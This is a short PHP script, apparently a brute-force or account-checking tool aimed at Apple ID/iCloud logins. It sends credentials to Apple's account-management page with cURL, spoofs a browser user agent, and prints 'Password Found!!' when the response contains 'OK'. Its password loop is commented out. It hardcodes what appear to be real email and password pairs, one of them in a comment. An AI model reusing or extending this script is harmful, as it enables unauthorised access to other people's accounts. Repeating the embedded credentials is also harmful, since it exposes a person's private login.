<?php
$cok='cookies/icloud.txt';	
$msg='';						
global $proxy;
$url= 'http://appleid.apple.com/account/manage';
session_start();
require("simple_html_dom.php");
// for($i=0;$i<40;$i++)
// {
					
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HEADER, 0); // return headers 0 no 1 yes
curl_setopt($ch, CURLOPT_USERPWD,'ahmed-ms@hotmail.fr:20974397Ab');//extraphonne@gmail.com:Ab20974397');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // return page 1:yes
curl_setopt($ch, CURLOPT_TIMEOUT, 200); // http request timeout 20 seconds
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects, need this if the url changes
curl_setopt($ch, CURLOPT_MAXREDIRS, 2); //if http server gives redirection responce
curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7");

curl_setopt($ch, CURLOPT_COOKIEJAR, $cok); // cookies storage / here the changes have been made
curl_setopt($ch, CURLOPT_COOKIEFILE, $cok);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // false for https
curl_setopt($ch, CURLOPT_ENCODING, "gzip"); // the page encoding
$data = curl_exec($ch); // execute the http request



		// if($data)
		// {
		// $htmll = str_get_html($data);
		// echo '===>'.$htmll;
		// $res=$htmll->find('b',1)->innertext;
		// $ress=$htmll->find('b',4)->innertext;
		// $nck=trim(substr($res,32));
		// echo '==>'.$res;
		// echo '==>'.$ress.$i;
	
		// }





$pos = strpos($data, "OK");
	if($pos > 0) 
		{
			$got = 1;
			echo '<font color="green"><b>Password Found!!</b><br>';
			echo'--------------<br>';
			echo '<font color="green">Brutforce Done AT Line '.$i.'<br>';

	}
// }	
	?>